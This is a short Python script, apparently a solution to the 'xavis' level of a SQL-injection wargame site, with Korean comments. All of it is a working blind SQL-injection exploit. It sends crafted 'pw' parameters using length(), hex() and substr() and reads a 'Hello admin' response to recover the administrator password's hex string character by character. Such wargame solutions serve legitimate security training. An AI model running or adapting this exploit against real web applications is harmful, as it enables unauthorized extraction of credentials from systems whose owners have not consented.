import urllib3
import requests

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?"
header = {"Cookie":"PHPSESSID=YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력

pw = ""

length = 0

for i in range(0,30):
    query = "pw=' or length(hex(pw))={}%23".format(i)
    req = requests.get(url+query, headers=header)
    print(url+query)
    print("[+] send req length is {}".format(i))
    #print(req.text)
    if "Hello admin" in req.text:
        length = i
        break

print("password hex length is : ",length)

#range(33,126)을 한 이유는 ascii 코드표를 보면 hex 값 33~126까지가 사람이 입력할 수 있는 입력값이므
for i in range(1, length+1):
    for j in range(33,126):
        query = "pw=' or substr(hex(pw),{},1)='{}'%23".format(i, chr(j))
        req = requests.get(url+query, headers=header)
        print(url+query)
        if "Hello admin" in req.text:
            pw = pw + chr(j)
            print(pw)
            break
            
